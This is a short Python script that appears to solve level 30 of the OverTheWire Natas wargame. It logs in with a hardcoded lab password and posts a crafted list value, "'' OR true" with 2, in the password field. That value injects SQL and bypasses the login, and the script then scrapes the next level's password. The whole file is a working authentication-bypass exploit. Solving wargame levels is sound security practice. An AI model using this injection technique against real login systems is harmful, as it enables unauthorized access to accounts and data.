import requests
import re

username = "natas30"
natas30_pass = "wie9iexae0Daihohv8vuu3cei9wahf0e"
url = "http://natas30.natas.labs.overthewire.org"
sess = requests.Session()

response = sess.post(url=url, auth=(username,natas30_pass), 
		data={"username":"natas31", "password":["'' OR true", 2]})
print(re.findall("<br>[A-Za-z0-9]*<?", response.text))
